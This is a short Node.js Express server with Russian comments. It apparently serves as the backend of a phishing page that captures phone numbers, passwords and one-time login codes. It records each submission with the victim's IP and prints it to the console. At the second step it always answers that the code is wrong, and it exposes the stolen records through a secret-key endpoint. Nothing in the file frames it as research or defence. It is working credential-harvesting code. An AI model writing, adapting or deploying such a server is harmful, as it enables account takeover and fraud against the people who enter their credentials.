const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Для Render - сохраняем в память, т.к. дисковая система временная
let logs = [];

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

app.post('/api/submit', (req, res) => {
    const { phone, password, code, step } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.ip;
    const time = new Date().toLocaleString();
    
    const data = { time, step, phone, password, code, ip };
    logs.push(data);
    
    console.log(`\n[${time}] НОВЫЕ ДАННЫЕ`);
    console.log(`📱 Номер: ${phone || 'скрыт'}`);
    if (step === 1) console.log(`🔑 Пароль: ${password}`);
    if (step === 2) console.log(`📲 Код: ${code}`);
    console.log(`🌐 IP: ${ip}`);
    
    if (step === 1) {
        res.json({ success: true, message: 'Код отправлен' });
    } else {
        res.json({ success: false, error: 'Неверный код' });
    }
});

// Эндпоинт для получения логов (только если знаешь секретный ключ)
app.get('/api/logs', (req, res) => {
    const secret = req.query.secret;
    if (secret === 'your_secret_key_123') {
        res.json(logs);
    } else {
        res.status(403).json({ error: 'Unauthorized' });
    }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`🚀 Сервер запущен на порту ${port}`);
});
